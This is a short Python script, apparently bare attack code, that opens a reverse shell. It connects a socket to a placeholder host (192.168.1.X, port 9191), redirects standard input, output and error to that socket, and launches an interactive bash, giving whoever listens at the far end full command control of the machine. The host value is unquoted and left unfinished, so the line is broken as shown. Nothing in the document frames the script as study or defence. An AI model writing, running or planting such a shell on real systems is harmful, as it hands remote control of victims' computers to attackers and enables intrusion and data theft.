import subprocess
import socket
import os

host = 192.168.1.X # server name
port = 9191 #port

sock = socket.socket()
sock.connect((host, port))

os.dup2(sock.fileno(),0)
os.dup2(sock.fileno(),1)
os.dup2(sock.fileno(),2)

subprocess.call(["bash", "-i"])
